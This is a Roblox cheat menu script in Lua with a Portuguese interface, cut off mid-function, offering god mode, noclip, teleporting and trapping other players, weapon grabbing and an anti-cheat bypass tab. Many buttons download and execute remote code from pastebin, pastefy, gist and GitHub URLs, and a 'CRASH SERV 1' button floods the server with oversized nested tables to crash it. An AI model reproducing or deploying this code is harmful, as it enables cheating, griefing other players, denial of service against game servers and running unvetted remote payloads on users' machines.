local MacLib = loadstring(game:HttpGet("https://github.com/biggaboy212/Maclib/releases/latest/download/maclib.txt"))()

local Window = MacLib:Window({
    Title = "★彡[ᴇᴅᴇx ᴍᴇɴᴜ]彡★",
    Subtitle = "VERSÃO 1.21",
    Size = UDim2.fromOffset(868, 650),
    DragStyle = 1,
    DisabledWindowControls = {},
    ShowUserInfo = true,
    Keybind = Enum.KeyCode.RightControl,
    AcrylicBlur = true,
})


local Global_Setting = Window:GlobalSetting({
    Name = "✅MENU ON✅",
    Default = false,
    Callback = function(State)
        print("Moderator Join Alerts " .. (State and "Enabled" or "Disabled"))
    end,
})




--//////////////////////TABS TABS TABAS///////////////////////


local jgTabGroup = Window:TabGroup()
local jgTab = jgTabGroup:Tab({
    Name = "JOGADOR",
    Image = "rbxassetid://7743876054"
})
local trollTab = jgTabGroup:Tab({
    Name = "Online",
    Image = "rbxassetid://104725899280047"
})





local wpTabGroup = Window:TabGroup()
local wpTab = wpTabGroup:Tab({
    Name = "ARMAS",
    Image = "rbxassetid://14511894009"
})

local btyTabGroup = Window:TabGroup()
local BypassTab = btyTabGroup:Tab({
    Name = "👩‍💻 BYPASS CLEAR ANT-CHEAT",

})





local ciTabGroup = Window:TabGroup()
local miniTab = ciTabGroup:Tab({
    Name = "🏙  MINI CITY",
})
local cdaTab = ciTabGroup:Tab({
    Name = "🏙  CIDADE ALTA",

})






--///////////////////////////////JOGADOR///////////////////////////////




local plrSection = jgTab:Section({
    Side = "Left" 
})

local moviSection = jgTab:Section({
    Side = "Right" 
})


plrSection:Button({
    Name = "GOD MODE",
    Callback = function()
        print("Killed everyone.")
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character.Humanoid

        print('Godmode working.')

        Humanoid.MaxHealth = 999999
        Humanoid.Health = Humanoid.MaxHealth / 2

        Humanoid.HealthChanged:connect(function()
            if Humanoid.Health < 10 then
                Humanoid.Health = Humanoid.MaxHealth
            end
        end)


        local Players = game:GetService("Players")
        local StarterGui = game:GetService("StarterGui")

        -- Criar uma ScreenGui
        local screenGui = Instance.new("ScreenGui")
        screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

        -- Criar um TextLabel
        local textLabel = Instance.new("TextLabel")
        textLabel.Parent = screenGui
        textLabel.Size = UDim2.new(0, 300, 0, 50) -- Largura e altura
        textLabel.Position = UDim2.new(0.7, -150, 0, 10) -- Posição no topo da tela
        textLabel.BackgroundTransparency = 1 -- Transparência total
        textLabel.Text = "🐉ᴇᴅᴇx ᴍᴇɴᴜ🐉" -- Texto exibido
        textLabel.TextScaled = true -- Ajusta automaticamente o tamanho do texto
        textLabel.Font = Enum.Font.SourceSansBold -- Define a fonte

        -- Efeito RGB no texto
        local TweenService = game:GetService("TweenService")
        local colors = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255)}
        local index = 1

        while true do
            local colorTween = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextColor3 = colors[index]})
            colorTween:Play()
            colorTween.Completed:Wait()
            index = index % #colors + 1
        end

    end,
})

plrSection:Button({
    Name = "BLOQUEAR ALGEMA E TP",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
local player = Players.LocalPlayer
local isLocked = false  -- Variável para controle do toggle
local humanoidRootPart = nil
local lockedPosition = nil

-- Função para travar o jogador
local function lockPosition()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        humanoidRootPart = player.Character.HumanoidRootPart
        lockedPosition = humanoidRootPart.Position

        -- Loop que mantém o jogador na posição fixa
        while isLocked do
            if humanoidRootPart then
                humanoidRootPart.Velocity = Vector3.new(0, 0, 0)  -- Remove qualquer velocidade
                humanoidRootPart.CFrame = CFrame.new(lockedPosition)  -- Mantém na posição fixa
            end
            task.wait(0.1)  -- Pequeno delay para otimizar desempenho
        end
    end
end

-- Toggle para ativar ou desativar
local function toggleLock()
    isLocked = not isLocked
    if isLocked then
        lockPosition()
    end
end

-- Criando um botão na interface para ativar/desativar
local ScreenGui = Instance.new("ScreenGui", game.Players.LocalPlayer:WaitForChild("PlayerGui"))
local ToggleButton = Instance.new("TextButton")

ToggleButton.Size = UDim2.new(0, 200, 0, 50)
ToggleButton.Position = UDim2.new(0.5, -100, 0.9, -25)
ToggleButton.Text = "BLOQUEAR ALGEMA E TP"
ToggleButton.Parent = ScreenGui
ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

ToggleButton.MouseButton1Click:Connect(function()
    toggleLock()
    if isLocked then
        ToggleButton.Text = "Destravar"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    else
        ToggleButton.Text = "Travar Posição"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

    end,
})



plrSection:Button({
    Name = "INVISIVEL",
    Callback = function()
        print("Killed everyone.")
        local player = game.Players.LocalPlayer

        -- Esconde o personagem
        local function hideCharacter()
            if player.Character then
                for _, part in ipairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("MeshPart") then
                        part.Transparency = 1
                        part.CanCollide = false
                    elseif part:IsA("Decal") then
                        part.Transparency = 1
                    end
                end
            end
        end

        -- Esconde o nome do jogador
        local function hideName()
            local character = player.Character
            if character then
                local humanoid = character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid.DisplayName = ""
                end
            end
        end

        -- Evita que informações sejam exibidas no chat
        local function disableChat()
            local playerGui = player:FindFirstChild("PlayerGui")
            if playerGui then
                local chatFrame = playerGui:FindFirstChild("ChatFrame")
                if chatFrame then
                    chatFrame.Visible = false
                end
            end
        end

        -- Executa ao carregar o personagem
        player.CharacterAdded:Connect(function()
            hideCharacter()
            hideName()
        end)

        -- Aplica imediatamente ao carregar o jogo
        if player.Character then
            hideCharacter()
            hideName()
        end

        -- Opcional: Esconde o chat
        disableChat()
    end,
})



plrSection:Button({
    Name = "CORDENADAS DO JOGADOR",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

-- Criando a interface gráfica
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")

local coordButton = Instance.new("TextButton")
coordButton.Parent = screenGui
coordButton.Size = UDim2.new(0, 200, 0, 50)
coordButton.Position = UDim2.new(0.05, 0, 0.05, 0) -- Canto superior esquerdo
coordButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
coordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
coordButton.TextSize = 16
coordButton.Font = Enum.Font.SourceSans
coordButton.Text = "Carregando..."
coordButton.AutoButtonColor = true

-- Atualiza a cada frame as coordenadas do jogador
game:GetService("RunService").RenderStepped:Connect(function()
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local position = character.HumanoidRootPart.Position
        local coordText = string.format("%.1f %.1f %.1f", position.X, position.Y, position.Z)
        coordButton.Text = coordText
    end
end)

-- Função para copiar ao clicar
coordButton.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(coordButton.Text)
        coordButton.Text = "Copiado!"
        task.wait(1)
    end
end)




Window:Notify({
    Title = "APERTE NA CORDENADA PARA COPIAR!!!!",
    Description = "Hello, World!",
    Lifetime = 5
})
    end,
})


plrSection:Button({
    Name = "TELEPORTA PARA PLAYER",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet(("https://pastebin.com/raw/YNVbeqPy")))()
    end,
})

plrSection:Button({
    Name = "ESPECTAR JOGADORES",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute("Script2")
    end,
})




plrSection:Button({
    Name = "COMANDOS DE ADM",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
    end,
})

moviSection:Button({
    Name = "NOCLIP",
    Callback = function()
        print("Killed everyone.")
         -- Made By zack;#6969

-- Instances:

local FlyScript = Instance.new("ScreenGui")
local Gradient = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local UICorner = Instance.new("UICorner")
local Button = Instance.new("TextButton")
local Shadow = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")

--Properties:

FlyScript.Name = "FlyScript"
FlyScript.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
FlyScript.ResetOnSpawn = false

Gradient.Name = "Gradient"
Gradient.Parent = FlyScript
Gradient.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Gradient.BorderColor3 = Color3.fromRGB(27, 42, 53)
Gradient.BorderSizePixel = 0
Gradient.Position = UDim2.new(0.0199062824, 0, 0.781767964, 0)
Gradient.Size = UDim2.new(0, 231, 0, 81)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(57, 104, 252)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(51, 68, 175))}
UIGradient.Parent = Gradient

UICorner.CornerRadius = UDim.new(0.0399999991, 0)
UICorner.Parent = Gradient

Button.Name = "Button"
Button.Parent = Gradient
Button.BackgroundColor3 = Color3.fromRGB(77, 100, 150)
Button.BorderSizePixel = 0
Button.Position = UDim2.new(0.0921155736, 0, 0.238353431, 0)
Button.Size = UDim2.new(0, 187, 0, 41)
Button.ZIndex = 2
Button.Font = Enum.Font.GothamSemibold
Button.Text = ""
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.TextScaled = true
Button.TextSize = 14.000
Button.TextWrapped = true

Shadow.Name = "Shadow"
Shadow.Parent = Button
Shadow.BackgroundColor3 = Color3.fromRGB(53, 69, 103)
Shadow.BorderSizePixel = 0
Shadow.Size = UDim2.new(1, 0, 1, 4)

TextLabel.Parent = Gradient
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.487012982, 0, 0.5, 0)
TextLabel.Size = UDim2.new(0.878787875, -20, 0.728395045, -20)
TextLabel.ZIndex = 2
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = "Fly"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
Button.MouseButton1Down:connect(function()
    repeat wait()
    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
    local mouse = game.Players.LocalPlayer:GetMouse()
    repeat wait() until mouse
    local plr = game.Players.LocalPlayer
    local torso = plr.Character.Torso
    local flying = true
    local deb = true
    local ctrl = {f = 0, b = 0, l = 0, r = 0}
    local lastctrl = {f = 0, b = 0, l = 0, r = 0}
    local maxspeed = 50
    local speed = 0

    function Fly()
        local bg = Instance.new("BodyGyro", torso)
        bg.P = 9e4
        bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        bg.cframe = torso.CFrame
        local bv = Instance.new("BodyVelocity", torso)
        bv.velocity = Vector3.new(0,0.1,0)
        bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
        repeat wait()
            plr.Character.Humanoid.PlatformStand = true
            if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
                speed = speed+.5+(speed/maxspeed)
                if speed > maxspeed then
                    speed = maxspeed
                end
            elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
                speed = speed-1
                if speed < 0 then
                    speed = 0
                end
            end
            if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
                lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
            elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
                bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
            else
                bv.velocity = Vector3.new(0,0.1,0)
            end
            bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
        until not flying
        ctrl = {f = 0, b = 0, l = 0, r = 0}
        lastctrl = {f = 0, b = 0, l = 0, r = 0}
        speed = 0
        bg:Destroy()
        bv:Destroy()
        plr.Character.Humanoid.PlatformStand = false
    end
    mouse.KeyDown:connect(function(key)
        if key:lower() == "e" then
            if flying then flying = false
            else
                flying = true
                Fly()
            end
        elseif key:lower() == "w" then
            ctrl.f = 1
        elseif key:lower() == "s" then
            ctrl.b = -1
        elseif key:lower() == "a" then
            ctrl.l = -1
        elseif key:lower() == "d" then
            ctrl.r = 1
        end
    end)
    mouse.KeyUp:connect(function(key)
        if key:lower() == "w" then
            ctrl.f = 0
        elseif key:lower() == "s" then
            ctrl.b = 0
        elseif key:lower() == "a" then
            ctrl.l = 0
        elseif key:lower() == "d" then
            ctrl.r = 0
        end
    end)
    Fly()

end)
-- Scripts:

local function LHMZZV_fake_script() -- FlyScript.Script 
    local script = Instance.new('Script', FlyScript)

    frame = script.Parent.Gradient -- Take out {}s, and put name of frame
    frame.Draggable = true
    frame.Active = true
    frame.Selectable = true
end
coroutine.wrap(LHMZZV_fake_script)()

    end,
})


moviSection:Button({
    Name = "FREECAM",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Freecam'))()
    end,
})


plrSection:Button({
    Name = "SUPER PULO",
    Callback = function()
        print("Killed everyone.")
        local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Ajusta a potência do pulo
local superJumpPower = 200 -- Pulo super alto

-- Função que aumenta o pulo quando o jogador pressiona espaço
local function onJump()
    humanoid.JumpPower = superJumpPower
    humanoid.Jump = true
    wait(0.2) -- Pequeno delay para garantir o efeito
    humanoid.JumpPower = 50 -- Volta ao normal depois do pulo
end

-- Detecta quando o jogador tenta pular
humanoid.StateChanged:Connect(function(old, new)
    if new == Enum.HumanoidStateType.Jumping then
        onJump()
    end
end)

-- Impede o dano de queda
humanoid.StateChanged:Connect(function(old, new)
    if new == Enum.HumanoidStateType.Freefall then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false)
    end
end)

humanoid.HealthChanged:Connect(function(health)
    if health < humanoid.MaxHealth then
        humanoid.Health = humanoid.MaxHealth -- Impede perda de vida
    end
end)


    end,
})


moviSection:Button({
    Name = "TELEPORTA PARA ONDE OLHA",
    Callback = function()
        print("Killed everyone.")
        local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
local userInputService = game:GetService("UserInputService")

-- Função para teleportar o jogador
local function teleport()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local rootPart = player.Character.HumanoidRootPart
        local targetPosition = mouse.Hit.p -- Obtém a posição do mouse no mundo

        -- Ajusta a posição para evitar que o jogador fique preso no chão
        targetPosition = Vector3.new(targetPosition.X, targetPosition.Y + 3, targetPosition.Z)

        -- Move o jogador para a posição
        rootPart.CFrame = CFrame.new(targetPosition)
    end
end

-- Detecta quando o jogador pressiona "Z"
userInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.Z then
        teleport()
    end
end)


Window:Notify({
    Title = "PARA TELEPORTA APERTE Z!!!!",
    Description = "EDEXMENU!!",
    Lifetime = 5
})
    end,
})





--///////////////////////////////TROLL///////////////////////////////



local tr1Section = trollTab:Section({
    Side = "Left" 
})

local tr2Section = trollTab:Section({
    Side = "right" 
})




tr1Section:Button({
    Name = "PUXAR GERAL",
    Callback = function()
    Description = "DARKZIÃO",
        print("Killed everyone.")
        local Players = game:GetService("Players")

        local function teleportAllPlayersToMe()
            local localPlayer = Players.LocalPlayer
            if localPlayer then
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= localPlayer then
                        player.Character:MoveTo(localPlayer.Character.HumanoidRootPart.Position)
                    end
                end
            end
        end

        teleportAllPlayersToMe()
    end,
})




tr1Section:Button({
    Name = "SPAWNAR UM SOFA",
    Callback = function()
        print("Killed everyone.")
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        local function spawnSofa()
            -- Criando o modelo do sofá
            local sofa = Instance.new("Model")
            sofa.Name = "SofaCar"

            -- Criando a base do sofá
            local base = Instance.new("Part")
            base.Size = Vector3.new(6, 1, 4)
            base.Position = humanoidRootPart.Position + Vector3.new(0, 2, 0)
            base.Anchored = false
            base.BrickColor = BrickColor.new("Brown")
            base.Material = Enum.Material.Wood
            base.Name = "Base"
            base.Parent = sofa

            -- Criando o assento (VehicleSeat)
            local seat = Instance.new("VehicleSeat")
            seat.Size = Vector3.new(2, 1, 2)
            seat.Position = base.Position + Vector3.new(0, 1, 0)
            seat.Anchored = false
            seat.BrickColor = BrickColor.new("Dark stone grey")
            seat.Name = "DriverSeat"
            seat.Parent = sofa

            -- Criando os encostos do sofá
            local backrest = Instance.new("Part")
            backrest.Size = Vector3.new(6, 2, 1)
            backrest.Position = base.Position + Vector3.new(0, 1, -1.5)
            backrest.Anchored = false
            backrest.BrickColor = BrickColor.new("Brown")
            backrest.Parent = sofa

            -- Criando as laterais do sofá
            for _, offset in ipairs({-2.5, 2.5}) do
                local side = Instance.new("Part")
                side.Size = Vector3.new(1, 2, 4)
                side.Position = base.Position + Vector3.new(offset, 1, 0)
                side.Anchored = false
                side.BrickColor = BrickColor.new("Brown")
                side.Parent = sofa
            end

            -- Definindo a PrimaryPart para movimentação
            sofa.PrimaryPart = base

            -- Criando Welds para unir as partes
            local function weldParts(part1, part2)
                local weld = Instance.new("WeldConstraint")
                weld.Part0 = part1
                weld.Part1 = part2
                weld.Parent = part1
            end

            weldParts(base, seat)
            weldParts(base, backrest)
            for _, part in ipairs(sofa:GetChildren()) do
                if part:IsA("Part") and part ~= base then
                    weldParts(base, part)
                end
            end

            -- Adicionando o sofá ao Workspace
            sofa.Parent = game.Workspace

            -- Fazendo o jogador sentar automaticamente
            seat:Sit(character:FindFirstChild("Humanoid"))

            -- Movimentação do sofá
            local speed = 20
            local turnSpeed = 2

            game:GetService("RunService").Stepped:Connect(function(_, deltaTime)
                if seat.Occupant then
                    local humanoid = seat.Occupant
                    local moveDir = humanoid.MoveDirection

                    local rotation = 0
                    if moveDir.Z < 0 then
                        sofa:SetPrimaryPartCFrame(sofa.PrimaryPart.CFrame * CFrame.new(0, 0, -speed * deltaTime))
                    elseif moveDir.Z > 0 then
                        sofa:SetPrimaryPartCFrame(sofa.PrimaryPart.CFrame * CFrame.new(0, 0, speed * deltaTime))
                    end
                    if moveDir.X < 0 then
                        rotation = turnSpeed * deltaTime
                    elseif moveDir.X > 0 then
                        rotation = -turnSpeed * deltaTime
                    end

                    sofa:SetPrimaryPartCFrame(sofa.PrimaryPart.CFrame * CFrame.Angles(0, rotation, 0))
                end
            end)
        end 

        -- Spawnando o sofá quando o jogador entra no jogo
        spawnSofa()
    end,
})



tr1Section:Button({
    Name = "BUGAR O CEU",
    Callback = function()
        print("Killed everyone.")
        local Lighting = game:GetService("Lighting")

        -- Criando um efeito de piscar no céu
        while true do
            -- Gera uma cor aleatória
            local randomColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))

            -- Aplica a cor ao Sky
            if Lighting:FindFirstChild("Sky") then
                Lighting.Ambient = randomColor
                Lighting.OutdoorAmbient = randomColor
            end

            -- Pequena espera antes da próxima piscada
            wait(0.5)
        end

    end,
})

tr1Section:Button({
    Name = "BATER UMA(LA ELE)",
    Callback = function()
        print("Killed everyone.")
        --Made by Muscle_legends2021 (Gio)
--YouTube: GioBolqvi
--Got skidded TWICE, Aquamatrix and SpiderScriptRB [fùck skidders]
--might not work on low unc level executors
loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
    end,
})

tr1Section:Button({
    Name = "SPAWNAR BARCO",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")

        local function getClosestPlayer(character)
            local closestPlayer = nil
            local shortestDistance = math.huge

            for _, player in pairs(Players:GetPlayers()) do
                if player.Character and player.Character ~= character then
                    local distance = (player.Character.PrimaryPart.Position - character.PrimaryPart.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        closestPlayer = player.Character
                    end
                end
            end

            return closestPlayer
        end

        local function createPrison(aroundCharacter)
            if not aroundCharacter or not aroundCharacter.PrimaryPart then return end

            local size = Vector3.new(5, 10, 1) -- Tamanho das grades
            local offset = 3 -- Distância das paredes ao redor do jogador

            local positions = {
                Vector3.new(offset, 5, 0),  -- Frente
                Vector3.new(-offset, 5, 0), -- Trás
                Vector3.new(0, 5, offset),  -- Direita
                Vector3.new(0, 5, -offset)  -- Esquerda
            }

            for _, pos in pairs(positions) do
                local part = Instance.new("Part")
                part.Size = size
                part.Anchored = true
                part.CanCollide = true
                part.Material = Enum.Material.Metal
                part.Color = Color3.fromRGB(100, 100, 100)
                part.Position = aroundCharacter.PrimaryPart.Position + pos
                part.Parent = game.Workspace
            end
        end

        local function imprisonClosestPlayer(character)
            local target = getClosestPlayer(character)
            if target then
                createPrison(target)
            end
        end

        local myCharacter = script.Parent
        RunService.Heartbeat:Connect(function()
            imprisonClosestPlayer(myCharacter)
        end)

    end,
})

tr1Section:Button({
    Name = "CRASH SERV 1",
    Callback = function()
        print("Killed everyone.")
        local char = game:GetService('Players').LocalPlayer.Character or nil
if char then
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
while wait(0.6) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end

local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}

table.insert(spammedtable, {})
z = spammedtable[1]

for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end

local calculatemax = getmaxvalue(tableincrease)
local maximum

if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end

for i = 1, maximum do
     table.insert(maintable, spammedtable)
end

for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end

bomb(250, 2) --// change values if client crashes
end

    end,
})




tr2Section:Button({
    Name = "COLOCAR BOLA EM TODOS",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")

        -- Função para colar a bola em um jogador
        local function attachBallToPlayer(player)
            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                local rootPart = character:FindFirstChild("HumanoidRootPart")

                -- Criando a bola
                local ball = Instance.new("Part")
                ball.Shape = Enum.PartType.Ball
                ball.Size = Vector3.new(10, 10, 10) -- Define o tamanho da bola
                ball.Material = Enum.Material.SmoothPlastic
                ball.Color = Color3.fromRGB(255, 0, 0) -- Vermelha
                ball.Anchored = false
                ball.CanCollide = false
                ball.Parent = character

                -- Criando a conexão (WeldConstraint)
                local weld = Instance.new("WeldConstraint")
                weld.Part0 = rootPart
                weld.Part1 = ball
                weld.Parent = ball

                -- Posicionando a bola na frente do jogador
                ball.Position = rootPart.Position + Vector3.new(0, 3, -3)
            end
        end

        -- Aplica a bola em todos os jogadores já conectados
        for _, player in pairs(Players:GetPlayers()) do
            attachBallToPlayer(player)
        end

        -- Quando um novo jogador entra, cola a bola nele
        Players.PlayerAdded:Connect(function(player)
            player.CharacterAdded:Connect(function()
                task.wait(1) -- Pequeno delay para garantir que o personagem carregou
                attachBallToPlayer(player)
            end)
        end)
    end,
})



tr2Section:Button({
    Name = "TELECINESE",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
    end,
})


tr2Section:Button({
    Name = "TELEPORTA PARA PLAYER",
    Callback = function()
        print("Killed everyone.")
        loadstring(game:HttpGet("https://gist.githubusercontent.com/DagerFild/b4776075a0d26ef04394133ee6bd2081/raw/0ed51ac94057d2d9a9f00e1b037b9011c76ca54a/tpGUI", true))()
    end,
})



tr2Section:Button({
    Name = "GRUDAR NO PLAYER",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

-- Criar a interface
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 300)
Frame.Position = UDim2.new(0, 10, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Frame.Parent = ScreenGui

local MinimizeButton = Instance.new("TextButton")
MinimizeButton.Size = UDim2.new(0, 50, 0, 30)
MinimizeButton.Position = UDim2.new(1, -50, 0, 0)
MinimizeButton.Text = "-"
MinimizeButton.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
MinimizeButton.Parent = Frame

local CancelButton = Instance.new("TextButton")
CancelButton.Size = UDim2.new(1, 0, 0, 50)
CancelButton.Position = UDim2.new(0, 0, 1, -50)
CancelButton.Text = "Cancelar"
CancelButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CancelButton.Parent = Frame

local selectedPlayer = nil
local attached = false
local minimized = false

function attachToPlayer(targetPlayer)
    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        attached = true
        RunService.Heartbeat:Connect(function()
            if attached and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 2, 0)
            end
        end)
    end
end

function createPlayerButton(player)
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 0, 30)
    Button.Text = player.Name
    Button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    Button.Parent = Frame

    Button.MouseButton1Click:Connect(function()
        selectedPlayer = player
        attachToPlayer(player)
    end)
end

function updatePlayerList()
    for _, child in pairs(Frame:GetChildren()) do
        if child:IsA("TextButton") and child ~= CancelButton and child ~= MinimizeButton then
            child:Destroy()
        end
    end

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            createPlayerButton(player)
        end
    end
end

CancelButton.MouseButton1Click:Connect(function()
    attached = false
end)

MinimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    Frame.Size = minimized and UDim2.new(0, 200, 0, 30) or UDim2.new(0, 200, 0, 300)
end)

Players.PlayerAdded:Connect(updatePlayerList)
Players.PlayerRemoving:Connect(updatePlayerList)
updatePlayerList()

    end,
})

tr2Section:Button({
    Name = "COLOCAR GRADES EM PLAYER PROXIMO",
    Callback = function()
        print("Killed everyone.")
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")

        local function getClosestPlayer(character)
            local closestPlayer = nil
            local shortestDistance = math.huge

            for _, player in pairs(Players:GetPlayers()) do
                if player.Character and player.Character ~= character then
                    local distance = (player.Character.PrimaryPart.Position - character.PrimaryPart.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        closestPlayer = player.Character
                    end
                end
            end

            return closestPlayer
        end

        local function createPrison(aroundCharacter)
            if not aroundCharacter or not aroundCharacter.PrimaryPart then return end

            local size = Vector3.new(5, 10, 1) -- Tamanho das grades
            local offset = 3 -- Distância das paredes ao redor do jogador

            local positions = {
                Vector3.new(offset, 5, 0),  -- Frente
                Vector3.new(-offset, 5, 0), -- Trás
                Vector3.new(0, 5, offset),  -- Direita
                Vector3.new(0, 5, -offset)  -- Esquerda
            }

            for _, pos in pairs(positions) do
                local part = Instance.new("Part")
                part.Size = size
                part.Anchored = true
                part.CanCollide = true
                part.Material = Enum.Material.Metal
                part.Color = Color3.fromRGB(100, 100, 100)
                part.Position = aroundCharacter.PrimaryPart.Position + pos
                part.Parent = game.Workspace
            end
        end

        local function imprisonClosestPlayer(character)
            local target = getClosestPlayer(character)
            if target then
                createPrison(target)
            end
        end

        local myCharacter = script.Parent
        RunService.Heartbeat:Connect(function()
            imprisonClosestPlayer(myCharacter)
        end)

    end,
})






--///////////////////////ARMAS//////////////////////

local arSection = wpTab:Section({
    Side = "Left" 
})

local aimSection = wpTab:Section({
    Side = "Right" 
})



arSection:Button({
    Name = "PUXAR ARMAS",
    Callback = function()
        print("Killed everyone.")
        for i, v in pairs(game:GetDescendants()) do
            if v:IsA('Tool') then
                v.Parent = game:GetService('Players').LocalPlayer.Backpack
            end
        end

        game:GetService('Players').LocalPlayer.Character.Humanoid.Died:Connect(function()
